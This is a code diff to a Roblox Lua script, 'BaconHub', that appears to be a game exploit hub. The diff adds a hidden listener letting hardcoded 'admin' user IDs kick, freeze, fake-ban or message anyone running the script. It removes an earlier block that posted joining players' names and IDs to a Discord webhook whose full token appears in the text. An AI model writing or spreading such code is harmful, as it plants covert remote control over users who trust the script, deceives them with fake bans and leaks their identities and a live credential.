@@ -1,4 +1,45 @@
 
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Shared folder
+local folder = ReplicatedStorage:FindFirstChild("BaconHubEvents")
+if not folder then
+    folder = Instance.new("Folder")
+    folder.Name = "BaconHubEvents"
+    folder.Parent = ReplicatedStorage
+end
+
+-- Remote to listen for commands
+local remote = folder:FindFirstChild(tostring(LocalPlayer.UserId) .. "_BH")
+if not remote then
+    remote = Instance.new("RemoteEvent")
+    remote.Name = tostring(LocalPlayer.UserId) .. "_BH"
+    remote.Parent = folder
+end
+
+-- Reaction system
+remote.OnClientEvent:Connect(function(cmd, msg)
+    local char = LocalPlayer.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if cmd == "Kick" then
+        LocalPlayer:Kick("You were kicked by a BaconHub Admin.")
+    elseif cmd == "Freeze" and root then
+        root.Anchored = true
+    elseif cmd == "Unfreeze" and root then
+        root.Anchored = false
+    elseif cmd == "FakeBan" then
+        LocalPlayer:Kick("You've been permanently banned from BaconHub.")
+    elseif cmd == "Message" then
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "📢 Message from Admin",
+            Text = msg or "Hello!",
+            Duration = 5
+        })
+    end
+end)
 -- ======= Services =======
 local Players = game:GetService("Players")
 local VirtualUser = game:GetService("VirtualUser")
@@ -947,193 +988,100 @@ if Player.Name ~= "Bacon_hack7698" then
 		end
 	end)
 end
-
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
-local StarterGui = game:GetService("StarterGui")
-local CoreGui = game:GetService("CoreGui")
-
--- ✅ Add your admin UserIds here:
-local owners = {
+-- ADMIN PANEL SYSTEM
+local trusted = {
     [8636199320] = true, -- You
-    [1234567890] = true  -- Friend (replace with real ID)
-}
-
--- ✅ Your webhook
-local webhook = "https://discord.com/api/webhooks/1384363322148913162/r4cCH8iNFWvzx3iUZoItNgVUHbNcfSvKHueYLhc3Y4Fy8xbkBTXzpvkhmUOuHxowxRD6"
-
--- 🔒 Only show if owner
-if not owners[LocalPlayer.UserId] then return end
-
--- 👤 Join Alert
-Players.PlayerAdded:Connect(function(player)
-    if player ~= LocalPlayer then
-        StarterGui:SetCore("SendNotification", {
-            Title = "👤 BaconHub User Joined",
-            Text = player.Name .. " has joined your game.",
-            Duration = 5
-        })
-
-        pcall(function()
-            HttpService:PostAsync(webhook, HttpService:JSONEncode({
-                content = "🔔 **BaconHub User Detected:** `" .. player.Name .. "` (`" .. player.UserId .. "`) joined place `" .. game.PlaceId .. "`"
-            }))
-        end)
-    end
-end)
-
--- 🌟 BaconHub Commander Panel (Admin GUI)
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local LocalPlayer = Players.LocalPlayer
-
-local trustedAdmins = {
-    [8636199320] = true, -- YOU
     [1234567890] = true, -- Your friend (change this!)
 }
 
--- 🧩 BaconHub Shared Events
-local folder = ReplicatedStorage:FindFirstChild("BaconHubEvents")
-if not folder then
-    folder = Instance.new("Folder", ReplicatedStorage)
-    folder.Name = "BaconHubEvents"
-end
+if not trusted[game.Players.LocalPlayer.UserId] then return end
 
--- 🎧 Listen for Commands (everyone must have this)
-local myRemote = folder:FindFirstChild(LocalPlayer.UserId .. "_BH") or Instance.new("RemoteEvent", folder)
-myRemote.Name = LocalPlayer.UserId .. "_BH"
-
-myRemote.OnClientEvent:Connect(function(cmd, msg)
-    local char = LocalPlayer.Character
-    local root = char and char:FindFirstChild("HumanoidRootPart")
-    if cmd == "Kick" then
-        LocalPlayer:Kick("You were kicked by a BaconHub admin.")
-    elseif cmd == "Freeze" and root then
-        root.Anchored = true
-    elseif cmd == "Unfreeze" and root then
-        root.Anchored = false
-    elseif cmd == "FakeBan" then
-        LocalPlayer:Kick("⚠️ You have been permanently banned from BaconHub.")
-    elseif cmd == "Message" then
-        game.StarterGui:SetCore("SendNotification", {
-            Title = "📢 Admin",
-            Text = msg or "Hello from BaconHub Admin!",
-            Duration = 6
-        })
-    end
-end)
-
--- ❌ Not an admin? Hide the panel.
-if not trustedAdmins[LocalPlayer.UserId] then return end
-
--- 🎛️ GUI Elements
 local gui = Instance.new("ScreenGui", game.CoreGui)
-gui.Name = "BaconCommander"
+gui.Name = "BaconHubAdmin"
 
-local toggle = Instance.new("TextButton", gui)
-toggle.Size = UDim2.new(0, 120, 0, 30)
-toggle.Position = UDim2.new(0, 10, 0.4, 0)
-toggle.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
-toggle.Text = "🛠️ Show Panel"
-toggle.TextColor3 = Color3.new(1, 1, 1)
-toggle.Font = Enum.Font.GothamBold
-toggle.TextSize = 14
-toggle.ZIndex = 5
+local toggleBtn = Instance.new("TextButton", gui)
+toggleBtn.Size = UDim2.new(0, 100, 0, 30)
+toggleBtn.Position = UDim2.new(0, 10, 0.5, -15)
+toggleBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+toggleBtn.Text = "Show Panel"
+toggleBtn.TextColor3 = Color3.new(1, 1, 1)
+toggleBtn.Font = Enum.Font.GothamBold
+toggleBtn.TextSize = 14
+toggleBtn.ZIndex = 10
 
 local panel = Instance.new("Frame", gui)
-panel.Size = UDim2.new(0, 480, 0, 340)
-panel.Position = UDim2.new(0.5, -240, 0.5, -170)
-panel.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
+panel.Size = UDim2.new(0, 450, 0, 300)
+panel.Position = UDim2.new(0.5, -225, 0.5, -150)
+panel.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
 panel.Visible = false
 panel.Active = true
 panel.Draggable = true
 
-local title = Instance.new("TextLabel", panel)
-title.Size = UDim2.new(1, 0, 0, 36)
-title.Text = "🧠 BaconHub Commander"
-title.TextColor3 = Color3.new(1, 1, 1)
-title.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-title.Font = Enum.Font.GothamBold
-title.TextSize = 18
-
-local scroll = Instance.new("ScrollingFrame", panel)
-scroll.Position = UDim2.new(0, 0, 0, 36)
-scroll.Size = UDim2.new(1, 0, 1, -36)
-scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
-scroll.BackgroundTransparency = 1
-scroll.ScrollBarThickness = 6
-
-local layout = Instance.new("UIListLayout", scroll)
-layout.Padding = UDim.new(0, 6)
-
--- Toggle Functionality
-toggle.MouseButton1Click:Connect(function()
+toggleBtn.MouseButton1Click:Connect(function()
     panel.Visible = not panel.Visible
-    toggle.Text = panel.Visible and "❌ Hide Panel" or "🛠️ Show Panel"
+    toggleBtn.Text = panel.Visible and "Hide Panel" or "Show Panel"
 end)
 
--- Generate Button
-local function createBtn(txt, color, parent)
-    local btn = Instance.new("TextButton", parent)
-    btn.Size = UDim2.new(0, 70, 0, 24)
-    btn.Text = txt
-    btn.BackgroundColor3 = color
-    btn.TextColor3 = Color3.new(1, 1, 1)
-    btn.Font = Enum.Font.GothamBold
-    btn.TextSize = 13
-    return btn
-end
+local scroll = Instance.new("ScrollingFrame", panel)
+scroll.Size = UDim2.new(1, 0, 1, 0)
+scroll.CanvasSize = UDim2.new(0, 0, 5, 0)
+scroll.ScrollBarThickness = 6
+scroll.BackgroundTransparency = 1
 
--- Add Player to GUI if they run BaconHub
-local function addPlayer(player)
-    if player == LocalPlayer then return end
-    local userRemote = folder:FindFirstChild(tostring(player.UserId) .. "_BH")
-    if not userRemote then return end
+local layout = Instance.new("UIListLayout", scroll)
+layout.Padding = UDim.new(0, 5)
+
+local function makeUserEntry(player)
+    local remote = ReplicatedStorage:WaitForChild("BaconHubEvents"):FindFirstChild(tostring(player.UserId) .. "_BH")
+    if not remote then return end
 
     local frame = Instance.new("Frame")
     frame.Size = UDim2.new(1, -10, 0, 60)
-    frame.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
+    frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
 
     local name = Instance.new("TextLabel", frame)
-    name.Size = UDim2.new(0.4, 0, 0.5, 0)
-    name.Position = UDim2.new(0, 6, 0, 6)
     name.Text = player.Name
-    name.TextColor3 = Color3.new(1,1,1)
-    name.Font = Enum.Font.Gotham
-    name.TextSize = 16
+    name.Size = UDim2.new(0.4, 0, 1, 0)
     name.BackgroundTransparency = 1
+    name.TextColor3 = Color3.new(1, 1, 1)
+    name.Font = Enum.Font.GothamBold
+    name.TextSize = 16
     name.TextXAlignment = Enum.TextXAlignment.Left
+    name.Position = UDim2.new(0, 5, 0, 0)
 
     local x = 0.42
-    local function send(cmd, msg)
-        userRemote:FireClient(player, cmd, msg)
-    end
-
-    local function addCmd(label, color, cmd, msg)
-        local btn = createBtn(label, color, frame)
+    local function addBtn(label, color, cmd, msg)
+        local btn = Instance.new("TextButton", frame)
+        btn.Size = UDim2.new(0, 60, 0, 24)
         btn.Position = UDim2.new(x, 0, 0.5, -12)
+        btn.BackgroundColor3 = color
+        btn.Text = label
+        btn.TextColor3 = Color3.new(1, 1, 1)
+        btn.Font = Enum.Font.Gotham
+        btn.TextSize = 13
         btn.MouseButton1Click:Connect(function()
-            send(cmd, msg)
+            remote:FireClient(player, cmd, msg)
         end)
-        x += 0.14
+        x = x + 0.14
     end
 
-    addCmd("Kick", Color3.fromRGB(255, 60, 60), "Kick")
-    addCmd("Freeze", Color3.fromRGB(50, 120, 255), "Freeze")
-    addCmd("Unfreeze", Color3.fromRGB(50, 255, 120), "Unfreeze")
-    addCmd("Ban", Color3.fromRGB(150, 0, 0), "FakeBan")
-    addCmd("Msg", Color3.fromRGB(255, 200, 0), "Message", "👋 Hello from Admin!")
+    addBtn("Kick", Color3.fromRGB(255, 50, 50), "Kick")
+    addBtn("Freeze", Color3.fromRGB(50, 120, 255), "Freeze")
+    addBtn("Unfreeze", Color3.fromRGB(50, 255, 120), "Unfreeze")
+    addBtn("Ban", Color3.fromRGB(150, 0, 0), "FakeBan")
+    addBtn("Msg", Color3.fromRGB(255, 200, 0), "Message", "👋 BaconHub Admin says hi!")
 
     frame.Parent = scroll
 end
 
--- Load current players
-for _, p in pairs(Players:GetPlayers()) do
-    task.delay(2, function() addPlayer(p) end)
+for _, p in ipairs(Players:GetPlayers()) do
+    task.delay(2, function()
+        makeUserEntry(p)
+    end)
 end
 
--- On join
 Players.PlayerAdded:Connect(function(p)
-    task.delay(3, function() addPlayer(p) end)
+    task.delay(2.5, function()
+        makeUserEntry(p)
+    end)
 end)
